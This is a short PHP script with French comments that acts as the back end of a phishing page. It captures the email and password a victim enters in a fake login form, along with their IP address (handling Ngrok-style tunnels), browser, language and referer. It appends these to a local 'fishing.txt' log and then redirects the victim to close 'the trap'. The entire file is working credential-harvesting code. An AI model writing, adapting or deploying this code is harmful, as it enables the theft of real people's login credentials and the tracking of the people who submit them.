<?php
// On vérifie que les données ont bien été envoyées en POST
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // 1. Récupération des identifiants du formulaire
    $email = isset($_POST['email']) ? $_POST['email'] : 'Non renseigné';
    $password = isset($_POST['password']) ? $_POST['password'] : 'Non renseigné';
    
    // 2. Récupération des informations de la victime (Headers HTTP)
    $date = date('Y-m-d H:i:s');
    
    // Détection de l'adresse IP (prend en compte l'utilisation de proxys/tunnels comme Ngrok)
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } elseif (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }

    // Récupération du User-Agent (Contient le système d'exploitation et le navigateur)
    $user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'Inconnu';
    
    // Récupération de la langue du système
    $language = isset($_SERVER['HTTP_ACCEPT_LANGUAGE']) ? $_SERVER['HTTP_ACCEPT_LANGUAGE'] : 'Inconnu';
    
    // Récupération de la page précédente (Utile pour savoir d'où vient le clic)
    $referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'Direct ou masqué';

    // 3. Formatage propre et lisible pour votre fichier texte
    $log_entry = "==================================================\n";
    $log_entry .= "[-] Date/Heure : $date\n";
    $log_entry .= "[-] Cible      : $email\n";
    $log_entry .= "[-] Mot de passe: $password\n";
    $log_entry .= "[-] Adresse IP : $ip\n";
    $log_entry .= "[-] Navigateur : $user_agent\n";
    $log_entry .= "[-] Langue     : $language\n";
    $log_entry .= "[-] Venu de    : $referer\n";
    $log_entry .= "==================================================\n\n";

    // 4. Écriture dans le fichier local
    file_put_contents("fishing.txt", $log_entry, FILE_APPEND);

    // 5. Redirection finale pour clore le piège
    header("Location: mailto:clubinfoepo@gmail.com");
    exit();
}
?>
